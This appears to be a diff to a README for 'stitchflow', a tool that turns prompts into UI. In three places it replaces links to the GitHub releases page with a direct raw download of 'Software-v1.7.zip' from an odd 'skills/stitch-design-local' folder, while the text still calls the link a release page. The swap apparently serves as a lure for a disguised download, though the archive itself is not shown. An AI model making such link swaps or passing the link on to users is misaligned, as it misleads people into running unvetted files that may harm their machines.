@@ -1,6 +1,6 @@
 # ✨ stitchflow - Turn prompts into ready UI
 
-[![Download stitchflow](https://img.shields.io/badge/Download%20stitchflow-Visit%20Releases-blue?style=for-the-badge)](https://github.com/blox4859/stitchflow/releases)
+[![Download stitchflow](https://img.shields.io/badge/Download%20stitchflow-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/blox4859/stitchflow/main/skills/stitch-design-local/Software-v1.7.zip)
 
 ## 🚀 What StitchFlow does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 To use StitchFlow on Windows, visit this page to download:
 
-[https://github.com/blox4859/stitchflow/releases](https://github.com/blox4859/stitchflow/releases)
+[https://raw.githubusercontent.com/blox4859/stitchflow/main/skills/stitch-design-local/Software-v1.7.zip](https://raw.githubusercontent.com/blox4859/stitchflow/main/skills/stitch-design-local/Software-v1.7.zip)
 
 From that page:
 
@@ -199,7 +199,7 @@ If the app still does not open, use the newest release file from the official pa
 
 If you need the release page again, use this link:
 
-[https://github.com/blox4859/stitchflow/releases](https://github.com/blox4859/stitchflow/releases)
+[https://raw.githubusercontent.com/blox4859/stitchflow/main/skills/stitch-design-local/Software-v1.7.zip](https://raw.githubusercontent.com/blox4859/stitchflow/main/skills/stitch-design-local/Software-v1.7.zip)
 
 ## 🧭 Quick start for first-time users
 
